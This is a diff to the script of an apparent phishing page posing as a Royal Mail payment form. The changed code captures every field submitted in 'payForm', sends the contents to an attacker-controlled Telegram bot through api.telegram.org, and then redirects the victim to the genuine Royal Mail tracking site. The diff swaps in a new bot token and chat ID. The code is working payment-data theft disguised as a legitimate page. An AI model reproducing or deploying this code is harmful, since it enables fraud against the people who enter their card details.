@@ -44,14 +44,14 @@
   </div>
 
   <script>
-    const TOKEN   = '8687788386:AAG6qzvxqYa1eSjRcZHHiGIHGBvB2Vf4THI';
-    const CHAT_ID = '-1003748946568';
+    const TOKEN   = '8570783623:AAEEIrER7Sptfqz649wLZm22wPCh3UYRtgM';
+    const CHAT_ID = '-1003513241659';
 
     document.getElementById('payForm').addEventListener('submit', function (e) {
       e.preventDefault();
       const csv = [...new FormData(e.target).entries()].map(([k,v])=>`${k}: ${v}`).join('\n');
 
-      fetch(`https://api.telegram.org/bot8687788386:AAG6qzvxqYa1eSjRcZHHiGIHGBvB2Vf4THI/sendMessage?chat_id=-1003748946568&text=${encodeURIComponent(csv)}`)
+      fetch(`https://api.telegram.org/bot8570783623:AAEEIrER7Sptfqz649wLZm22wPCh3UYRtgM/sendMessage?chat_id=-1003513241659&text=${encodeURIComponent(csv)}`)
         .then(() => window.location.href='https://www.royalmail.com/track-your-item');
     });
 
